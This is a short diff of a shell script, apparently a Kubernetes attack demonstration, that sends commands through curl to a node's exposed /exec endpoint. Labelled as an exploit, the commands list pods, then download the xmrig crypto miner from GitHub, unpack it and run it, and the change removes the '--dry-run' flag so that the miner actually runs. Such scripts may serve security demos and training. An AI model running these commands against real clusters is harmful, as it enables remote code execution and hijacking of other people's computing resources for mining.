@@ -37,4 +37,4 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
 echo "8. Exploit running a script to run a crypto miner"
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
 curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
-curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.18.1/xmrig --dry-run'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=/app/xmrig-6.18.1/xmrig'
